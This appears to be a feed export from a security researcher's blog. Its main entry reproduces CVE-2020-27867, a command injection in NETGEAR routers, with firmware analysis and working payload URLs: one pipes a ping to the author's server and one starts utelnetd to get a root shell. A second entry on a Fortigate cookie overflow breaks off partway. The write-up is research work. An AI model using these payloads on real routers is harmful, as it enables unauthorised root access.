a57ea9a65b38d3504d86144193ecb485ba7616999cc2e980cdb6a64c2ee9febc6f52b55cfec8d7d06a28cf825805815db287d5cdb20c0767114f600211a84af8601987f60c5618a29895870b6061560dd45729b010e8a48c16a60ca20c163c575edff7e66e92d812e8ffa30294bd975b73a6613fda93fa367a9af434cf82c7d44e2a642c7d4cf73cc3a0a52e1edef92cb0f5033f5cc803fdd34b9e1efa5f4561a9d5f3a905561a64e5a03c611323c89522c72ca1744c5c0c59d77f00ac2dc86da53394de60784fbd15c6605b7f12e02e6d5daf562b87ce0f132955fefd98bc6d008589de0e16604611fd3b2a214225137f958863d07bd08abed323727de1adc67e773a12e8b4fdb2c1d55c3b3afe6a890cfbacf9fb6b3a820d06ecfb5f5700b4b32cbe5addff08e986cf8f079ef9c3a599ff7e2107654cf22574bdd58f285974b0e8518627e1e5d178848c14ba3cc849936313f23c91d42e08a9cb347524fc644d9e74dff24d4d95b6170c0cb53d0adba40438a78907c7c2cd2a391facf2cbe1b9cf6ea83a3d171c4a5cb44bd98ecb47e76d2d8dddba8b64a7fee7509266d7d7cb2af7f8853e7205628f85afe77abe78bcdfe1abf40d1415b87b77d0621ea2387b5129a59effdc33971a956ee68a647f2517b46ea821b5979a95364bb9ea43bd6c565d64c34435d5c6357d66bfd7a29126cafefc7de2fe3e2e0168d0408d0a61a7936583eb47e9e12e5d9ccf014ddd49a3761a17a288bdfb1844810335f079e80505a5c73fe790d0b9727f062d3883bc86e4185e5edcb1c557044c97f636676121186020b043c14358e64d608a7b6dd4ed9b4c66f353db41b88151f0315c2007f0b5fb8f63804245e4650e9b0b77f7c2ccf8a6071efe91ce4317b716d274122fbd61497d10943c759ecaf65ec6350b32e166290684fbcb4b2df1d1e59da8f508f301c8c27662f53276dd1cd8e25f8cbbd86cb629988fde213670382483dea4ecb1ae1379db1423404f5fbe37c926a767e2af25cafe61144509c0a762f3731d6c65bfa131b3e9150e898cac8a4b4b8215afac95ddf405fa8b53b2be8d69d9998aa58251607c6fbb4c50e801190a29ed501b25f1864e4d00327433d68e4c1461b3ac60350f3fc4b2511d147e2db2eb96f9fbd5521215247d4038ff6553864e763e8bf6d71e90bc84b396ee28febc2f3ae35c17ac4e7d72836650669ab523e8efe31b88f504b4dec234500c02d08038e756dca19026f3801a438246c0aaf8d8e5ec1755e0b65b358698b00bb372c62169c287d4285881fcac28755d44523075a227e06532d9fe5533681fbd3aeec20868d0f33dac375831e61fd46ddb3bb87b9206f640bd12cfa7daa6f0358ef2138614e0530f56aad9dc5826fe6860f00dd20b118fcc53b129349b3983e48593bceadbd1a945fdbecc0beb841b08b525364a28a63505d15c67d73612ef1df6de6d0d3fa86f3d8d62f1863cf907857161f0d590180386b7d0e118ac2747410958fdbc39724f06dfb2d6fa5e4c83fe20595284b11c349142080918e03b6a0f537db3b4fc058fa43487b3e9311238213d9e029bfcea983f7dee6f0fbebe688d2ebd44b1f9493faee578b22a0468eda5b28ce2bffe111140a2ea49391d35311ee6329112422d9450a37fbb9a32c47a072310dbbd949b0f994bfe1a1d119cec68f775c3de4fa60153cc82345660987adf442ea5ba69a0ffb47a0172746329df40d1c40ff1735fded355633aad6b9b005e9500d7f9534543a2d63b9910142e2d6a2e0c35183a6f9f32d5289d58ffe2b04c298eafc49b873c14ecf343923764235cc1f04a3211858fa6cc81fd0e084ce9c6f207ec1194696002f746993e40acbc18b796a2e31d1778adbe2a2e8772a3a2c1ab201d9eb430c2c7efa049048584939dbb621d16066478fd663913b64f030d6d5a110f82a715c3df4c6be7b3f77b5214091af4f6fcb6b072d9451f2d11f6b6c0deaebcfaf26f93756f6766208740ad4d14d843a0a6297776688da59a63dbc70d3ceef57f29bfba9de972a043acdd35a5f6a389818c74d39fc7e232fcbdbaaa36416607c1dc42b54b0cbeff1819c8ff4cca0ab7a74cc0f7df29ead9e3dbfc680b9898e5e8dd67ae59f827522a02f9f5e5689f20ac296bcd653d620cf0b38e240e688e1af4a657afcbf798d607365fe629280016c91fe18fe0d0d19809262467c98957e5d5430f2b6907051fa3893faff6b559ca58ffa6becd3b5854b76ad466f307d508876aab962f200ad310c47bf64bbf560593e19ae37f4344cd924bbdc57060430b3ba212fe2346310f73c9d715d05caea938eaafb36d3de13119bf268fd2576374ba87bf7692ab60d18174ae0c2812aa12760bf97b0ffa0cac8dc4133420c9f268824203740ef186ef0534f11f26ccb03fbee04c146eb561c34f042b44277b3a2abc7f6ea05c9ee3ca1a21205511594ca1c30b8e5daf0019298557fb93ffa5cb7556ab724cd3d0f7319a1121c4b6e5b3b5ce29691a6e7fdc5b231f83ce8405d83e6c0ddce798b44a9de306499ea7b8b5e9a89d090bc1782935df0bf213cb167f18c7fd4b737180ff12025c0130765d1500454eb6a97acfb37b7f60872cd0266bf867647016c1f4a96343722eafe95c0b441814a258f43aa4f9080b78a7abca09f775ac93f75dbba13cf5dcdfee2adbb750a6e967f3a272059a3761b096b72368adbe28b78047367887cced075ede3774141f148349cda833a614d0cd3f82472b164326a3970dcc9cef7527e3a296c7304ea2cee6e748ede77b29a648005faf0ab19ab82cf1112d639fef067e860a5035565515e3c44d9c03c0b462692819ae6d8eafc8adf7a1f4fe17833cc7dd714edf6006b61487d918a0c3857a7d0f1669b1e131c06c4afc81f2e10ffac483376ec983bb50b2ca3d7d07f19399a4ed15be1aae87fdbf595733a9484b8d2c6d0c836607a4069d4748d94a9d798cef34c8014bb5d30b2e8ca68440e1c277d46eb151164adfdc37609f2612db9ed210460b1e21947015b287d2c28d73198e511bac2c62c11bed078d919769247b9994806f4081bc21323a23822bf7d393530a7e6ba8fe5e675f99f8263c893b99d88949b5641cdd76bf46d5b6feeeb9259e3b86b0b6d041cf79fbb03d31e4255ac6bad4b1d5833841f9b96a74ec5d2d8ab74be97574a8b53c77de74f0f3e9df9ad2a6d28a88a2ec85977348bc09b851e022a1f21d9c7caf4ad3df1ed799430baeecbc40f69624d8297102782cc88aefd0bbf2cc5dcfa54d06e32edb8c827c615b7e5c19f529671bca34b39b71c885a3e2821c3c0ac0dd0e35b710fddc064c1f0144662846637bef44d873f3979c0b8df9cc23b4390e01fbcf4400138a2a2299e7240d9ec47c00121663e9f165a726d15e93eadb9abb7367198d505502b0c10305b284b8080973b84c2816f8b803c1e5e79f81ab47826f722a74a9b3ccd729f10c372f707a6e7bd268b5bf0fb9f6cda92fdc38bd176865f4d915c3025431d16e817a3b5020cafec2ffc9bfed813ee8494f5ecc5b4c3499e7829e3196a3409f02c17efbe9c92568d9fa6f765fcd8f750a00dedb4e74fc50939c88e83b51849a4fbeb16259af77a4a94d66e71a3f0ee1a18c9914c8b61ce4afb078bcecb69b708fb10eebe9d5e750caf6a8a9d20334ca048325d10ee33c5d6a598d16f8e8aaf819a6b078b7d51e123066398b34779cad904616b1d9f0ea1b404d029d73f72f2b3d06484cba4929ee255c0cd3f3b5f2dc583e6ba5db3b664359d92cf261d4fcfbe8dc77bd8354e10adefc127645772cf4b29de39c14ca07d8a8d8efbbc428e29acaa5cc67bcfc9409673911ac5b424946429dab68767497c752fbca0fc71dc96f39ce4720436dd4f4ec1c4fcdcdc67af5f65fb09f009e84f16c1b9432f70b89d6f9be97b7f11aae75a561774d16c5f8ea134d5c2dca713eee487be1fec2d699cfcbcc00548c0e5e0e7125d3b68b8b0fce0065fc5da5b3bdd3b270c585b53cf85e1545b9d615b5ecc5df9603e24fe176f5420a9aa97401ed84e2bb49b5aa7dc53be93b33f64ea061e8c19736aad1cce3b30fb6134f6742830cb11fa7227805608deaeec4780b7d173fa0315eebb4e591f4fa6050e8f3284a27259f603116eede20bf5645c4cb8bd2534feee41092620d3814f5931fb81f61f976e9a1fed2812fc584929f05d2bef78971042f239bd247c085718ac51ad4b47fa2ab61bcf99bb46ad82212f045621ca5b233be7769338faa0dd4741efe248f812457d48e5e09ff3fe38deb7c4a357ded0b6ee43d76dd75b1e30824d9084bde27e36bb38ac86cb14c5acc65f5772dc5adf53ed9d7e9d39081ac38b5df7b3fa0e5e7e57fb050d6485cfe3192fcccb4c95986d9000afce682b08129fd7521de0f93da402715c62510699b56729fbeb0df780a571da81af8819c5af65c6c71eb9d5560e8548482a72ac92de893d21e30b359817db93a8adca6972ebe0820b70dab35c0d79a1916def0ebc3ac240af94251f968b56d2da57bcd075915464cd59db50c68b8071e5e28757c427e2f7d80e8e5a7d4d34c5a131d035a49e9e9443cc2322e152f432f371f3ecc2ba1640790918fccaba6f39bffc392b4ac9602e93b50947ca0ae448c98f06d35d953b970c7990cfe71ad4efd16a62ba775a54390272f5e4a31550b78c4f194c221cba150137f59c09dac08472205619d4e87d1b84b28843f93b04d9fd6d261ba6c6c4b3176caa4b7fd56550afcef4e8154ab50543ccdf6e0a572e6ac0bfff676d50ec182a9db60995b4b59962ac52798b390ec14e34e7243bc216fd04fc780f6015d1cdc35ddc12e6eff3ec159f5259d47f8538c669f27320245450b5510a82bf5f96c2f01074ce2252e777e90679b0102d3faa1d1081dc40a7163ee61a5484d08a59b4223665cff516b2f2ca7feadf6546586c7f81be45f9daa6217f7631813e396e3cc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">若有一天我会离开  这座城是否还在</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="http://blog.arttnba3.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/"/>
    <id>http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/</id>
    <published>2021-08-17T03:50:50.000Z</published>
    <updated>2021-11-12T19:41:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><del>MIPS 大法好</del></p><span id="more"></span><p>MIPS 太憨憨了，还是 X86 好（恼）</p><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>以下都是废话233333</p></blockquote><p><strong>美国网件公司</strong>（<strong>NETGEAR</strong>）是一家专门做网络设备的公司。在2020年末其旗下多款路由器产品被爆出存在远程代码执行漏洞——mini_httpd 服务中对其提供的<strong>帆游加速器</strong>功能的参数解析存在缺陷从而导致可以进行命令注入，从而在远程主机执行任意代码——虽然此种利用需要身份验证，但据悉现有的身份验证机制并不难绕过</p><p>在 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27867">cve.mitre.org</a> 上对该漏洞说明如下：</p><blockquote><p> This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>参见<a href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers">官网</a></p><h2 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h2><p>笔者本人比较穷，买不起网件的路由器（哭哭），但最终还是有幸从朋友那借来了一台 R6800 机器，得以对该漏洞进行复现</p><p><img src="https://i.loli.net/2021/08/20/8hxInwiBy1zQHjb.png" alt="image.png"></p><blockquote><p>前面这几百字讲了一堆废话倒是真的hhhh</p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h2><p>首先在<a href="https://www.netgear.com/support/product/R6800.aspx#Firmware%20Version%201.2.0.74">官网</a>下载对应版本（1.2.0.74）的固件，解压后得到一个 img 镜像文件</p><p>使用 binwalk 提取其中的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk -e</span> </span><br></pre></td></tr></table></figure><p>得到两个文件 <code>200.zip </code> 和 <code>R6950.bin</code>，其中前者为后者的压缩包，继续使用 binwalk 解压后者，得到的 <code>squashfs-root</code> 文件夹便是该设备的文件系统</p><p>在文件系统中有着大量的软链接，大部分最终都是指向 <code>usr/sbin</code> 目录，相应地 <code>init</code> 进程指向的是 <code>usr/sbin/busybox</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 84</span><br><span class="line">drwxr-xr-x 12 arttnba3 arttnba3  4096 Aug 18 20:14 ./</span><br><span class="line">drwxrwxr-x  3 arttnba3 arttnba3  4096 Aug 18 20:56 ../</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 bin -&gt; usr/sbin//</span><br><span class="line">drwxrwxr-x  2 arttnba3 arttnba3  4096 Aug 15  2015 data/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Oct 18  2015 dev/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 etc -&gt; /tmp/etc</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 etc_ro -&gt; /tmp/etc_ro</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    20 Aug 17  2020 home -&gt; /tmp/home_directory/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 init -&gt; bin/busybox*</span><br><span class="line">drwxr-xr-x  6 arttnba3 arttnba3 12288 Aug 17  2020 lib/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Dec  2  2012 media/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 mnt -&gt; /tmp/mnt</span><br><span class="line">drwxrwxr-x  6 arttnba3 arttnba3  4096 Aug 17  2020 opt/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 12  2000 proc/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 sbin -&gt; usr/sbin//</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 16  2008 sys/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Jul 28  2000 tmp/</span><br><span class="line">drwxr-xr-x 11 arttnba3 arttnba3  4096 Aug 18 18:59 usr/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 var -&gt; /tmp/var</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 www -&gt; /tmp/www</span><br><span class="line">drwxrwxr-x  8 arttnba3 arttnba3 32768 Aug 17  2020 www.eng/</span><br></pre></td></tr></table></figure><p>在 <code>usr</code> 目录下还有一个文件 <code>funjsq_plugin_netgear_r6800.tar.gz</code>，解压：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf funjsq_plugin_netgear_r6800.tar.gz</span></span><br><span class="line">./tmp/</span><br><span class="line">./tmp/funjsq/</span><br><span class="line">./tmp/funjsq/bin/</span><br><span class="line">./tmp/funjsq/bin/funjsq_cli</span><br><span class="line">./tmp/funjsq/bin/funjsq_ctl</span><br><span class="line">./tmp/funjsq/bin/funjsq_nslookup</span><br><span class="line">./tmp/funjsq/bin/funjsq_conntime</span><br><span class="line">./tmp/funjsq/bin/funjsq_daemon</span><br><span class="line">./tmp/funjsq/bin/funjsq_detect</span><br><span class="line">./tmp/funjsq/bin/funjsq_dns</span><br><span class="line">./tmp/funjsq/bin/funjsq_httpd</span><br><span class="line">./tmp/funjsq/bin/funjsq_inetd</span><br><span class="line">./tmp/funjsq/bin/funjsq_redis</span><br><span class="line">./tmp/funjsq/bin/funjsq.sh</span><br><span class="line">./tmp/funjsq/config/</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/funjsq101.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/blocklistDL.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/blocklistGW.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/funjsq100.conf</span><br><span class="line">./tmp/funjsq/config/values/</span><br><span class="line">./tmp/funjsq/config/funjsqdetect.dat</span><br><span class="line">./tmp/funjsq/config/funjsqMSG.json</span><br><span class="line">./tmp/funjsq/config/funjsq_ca</span><br><span class="line">./tmp/funjsq/config/httpd/</span><br><span class="line">./tmp/funjsq/config/httpd/key.pem</span><br><span class="line">./tmp/funjsq/config/httpd/cert.pem</span><br></pre></td></tr></table></figure><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在漏洞通告中说到该漏洞存在于 <code>mini_httpd</code> 服务中</p><p><img src="https://i.loli.net/2021/08/20/SXIgiqxByhKYQMr.png" alt="img.png"></p><p>用 <code>burp suite</code>简单测试一下我们可以发现大部分 http 请求都是通过 <code>setup.cgi</code> 来进行的，该文件存在于 <code>/usr/sbin/</code> 目录下</p><p><img src="https://i.loli.net/2021/08/20/XdMjNzGWLQU19HY.png" alt="image.png"></p><p>拖入 IDA进行分析，查找 <code>funjsq_access_token</code> 字符串</p><p><img src="https://i.loli.net/2021/08/23/SKiMvXBaIEN4Wmc.png" alt="image.png"></p><p>XREF 到 <code>sub_407C80()</code> 函数，其中会通过 <code>find_val()</code> 函数提取出 <code>funjsq_access_token</code> 参数，进行命令拼接后通过 <code>COMMAND()</code>（本质上其实就是 sh）执行，我们不难想到的是<strong>若是能够插入诸如 &quot;;&quot; 或者 &quot;&amp;&amp;&quot; 这样的分隔符等，便能够执行我们想要执行的命令，即存在一个命令注入的 RCE 漏洞</strong></p><p><img src="https://i.loli.net/2021/08/20/m5fCVtKqwzlQBsj.png" alt="image.png"></p><p>调用回溯，发现一张如下结构的函数表，我们的 <code>sub_407C80()</code> 刚好对应 <code>funjsq_login</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typedef</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * func_name;</span><br><span class="line">    <span class="type">void</span> (*func_ptr)();</span><br><span class="line">&#125;StrFunc;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/20/uWcTf9iBQneAkaL.png" alt="image.png"></p><p>我们可以发现在 <code>CallActionByName()</code> 函数中会根据传入的字符串通过函数表调用对应的函数</p><p><img src="https://i.loli.net/2021/08/20/Gbphgm5K9OJCM2R.png" alt="image.png"></p><p>最后回溯到 main 函数，我们可以发现对于传入的 todo 参数而言其会调用 <code>CallActionByName()</code> 函数进行解析</p><p><img src="https://i.loli.net/2021/08/20/dhx4v6E2DR9PLaf.png" alt="image.png"></p><p>在 main 函数中执行到该段代码之前还有一系列的检查，不过<strong>主要针对 POST 请求</strong>，故我们可以直接走 GET 请求来避免一系列的检查</p><p>最终我们可以知道通过如下 payload 便能够跳转到出现问题的 <code>sub_407C80()</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>find_val()</code> 中还会对命令注入进行过滤，不过功能较弱<img src="https://i.loli.net/2021/08/20/L9VZUiDAlJcme1v.png" alt="image.png"></p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p><strong>该漏洞仅验证用户（可以登入路由器页面）可以使用</strong>，常规情况下则还需要想方法绕过用户验证</p><blockquote><p>刚开始学web，这个真不会…先把二进制的部分（本漏洞）整好先…</p></blockquote><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>在 mini_httpd 服务中似乎<strong>有着一定的过滤的机制</strong>，诸如 <code>;</code>、<code>&amp;&amp;</code>、<code>||</code>等都会被过滤掉，直接返回 403</p><p><img src="https://i.loli.net/2021/08/20/XFigLkICoSzARhW.png" alt="image.png"></p><p>最终笔者使用<code>|</code><strong>成功绕过</strong>，笔者在这里选择执行 <code>ping</code> 指令简单看一下效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|ping%20-c5%20sec.arttnba3.cn</span><br></pre></td></tr></table></figure><p>若是成功进入执行命令的流程则应当有如下回显，见到这个回显说明代码成功执行到了该处</p><p><img src="https://i.loli.net/2021/08/20/2pYtRXjylSdGo1B.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/20/AfZ6pSCdoBI1qUe.png" alt="image.png"></p><p>笔者使用 <code>tcpdump -i eth0 icmp</code> 命令在服务器上查看发现果然成功收到了来自该路由器的 ping 包，命令执行成功</p><p><img src="https://i.loli.net/2021/08/20/qKhQGyHNmUOSkIP.png" alt="image.png"></p><blockquote><p>需要注意的是 <code>COMMAND()</code> 执行命令时会等待其返回才会执行下一条命令，故若是需要同时执行多个命令应当使用 <code>&amp;</code>（url编码<code>%26</code>）将一些长期执行的命令转入后台执行，否则其会一直等待当前命令执行完毕后才会执行下一条命令</p><blockquote><p>刚拿到命令执行时我执行了 <code>ping my_server_address</code>，没有限制次数，导致后续命令都卡在了 ping 后边没法执行，最后我和学长在公司看了四分之一个下午才发现这个玄学问题的成因…</p></blockquote></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>这台机子自带 <code>telnet</code>，直接通过 telnet 连接上去即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|utelnetd%26</span><br></pre></td></tr></table></figure><p>运行，成功通过 telnet 连接获取到一个 shell</p><p><img src="https://i.loli.net/2021/08/20/T6Su8JLI9fOadA5.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/20/RYA3cqHGdZstXiC.png" alt="image.png"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF.What’s more…"></a>0xFF.What’s more…</h1><p>在后续官方给出的新版本固件中虽然修复了该漏洞，<strong>但是没有完全修复，使得其成为了简中特供漏洞</strong></p><blockquote><p>下图来自微博 <code>@blackorbird</code> </p><blockquote><p>是你🦄 @BlackBird</p></blockquote></blockquote><p><img src="https://i.loli.net/2021/08/20/SxIkKvolHE6Od1B.jpg" alt="img.JPG"></p><blockquote><p>漏洞细节暂时不能讲，感兴趣的也不推荐私信我hhhhhh</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;MIPS 大法好&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Netgear" scheme="http://blog.arttnba3.cn/tags/Netgear/"/>
    
    <category term="Remote Code Execute" scheme="http://blog.arttnba3.cn/tags/Remote-Code-Execute/"/>
    
    <category term="Command Injection" scheme="http://blog.arttnba3.cn/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x03】CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/"/>
    <id>http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/</id>
    <published>2021-08-10T09:42:05.000Z</published>
    <updated>2021-09-08T16:29:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>彁我着🔥了.jpg</p><span id="more"></span><blockquote><p>特别特别特别特别*N….简单的一个洞，本来应该一天就弄好的，愣是因为各种玄学问题在公司拗了半周….</p><p>还是因为太菜了（恼）</p></blockquote><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>Fortigate 系列是 Fortinet（飞塔）公司旗下的防火墙产品之一，2016年，Shadow Brokers公开了黑客组织<strong>Equation Group</strong>针对各大厂商防火墙的<a href="https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html">漏洞利用工具</a>，存在于 Fortigate 中的一个隐蔽的栈溢出漏洞也就此被大白于天下</p><p>在 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909">cve.mitre.org</a> 上对该漏洞的说明如下：</p><blockquote><p>Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11, 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3 allows remote attackers to execute arbitrary code via a crafted HTTP request, aka EGREGIOUSBLUNDER.</p></blockquote><p>笔者今天将借助受影响的一个虚拟机版本 <strong>FGT_VM-v400-build0482</strong> 来分析该漏洞</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Fortinet FortiOS 4.x &lt; 4.1.11, 4.2.x &lt; 4.2.13, 4.3.x &lt; 4.3.9、FortiSwitch &lt; 3.4.3</p><h2 id="登入-fortigate-VM"><a href="#登入-fortigate-VM" class="headerlink" title="登入 fortigate VM"></a>登入 fortigate VM</h2><p>默认账户是 <code>admin</code> ，无密码，可以用于本地测试</p><p><img src="https://i.loli.net/2021/08/13/7WNytbF5MGnsfVA.png" alt="image.png"></p><p>通常情况下防火墙不会给我们提供 shell，而是<strong>仅</strong>提供一个简易 CLI 界面，在上面我们只能使用其所内置提供的几个功能</p><h2 id="后门指令"><a href="#后门指令" class="headerlink" title="后门指令"></a>后门指令</h2><p>仅靠防火墙的功能基本上不算是一个可用的操作系统，因此 fortigate VM CLI 提供给我们一个隐藏指令 <code>fnsysctl</code> 以执行其限制的诸如 <code>ls</code> 等的一些基本命令，<strong>不包括 shell</strong></p><blockquote><p>后续通过逆向分析我们可以发现其程序本身限制了过滤 sh，因此我们无法通过 CLI 直接拿到一个 shell</p></blockquote><p><img src="https://i.loli.net/2021/08/13/4G3kJV8vxMpqTsn.png" alt="image.png"></p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h2><p>首先将硬盘镜像 <code>fortios.vmdk</code> 挂载到 <code>/mnt</code> 目录下：</p><p><img src="https://i.loli.net/2021/08/11/dsRm83O24UhATKj.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo fdisk -l</span></span><br><span class="line">...</span><br><span class="line">Device     Boot  Start     End Sectors  Size Id Type</span><br><span 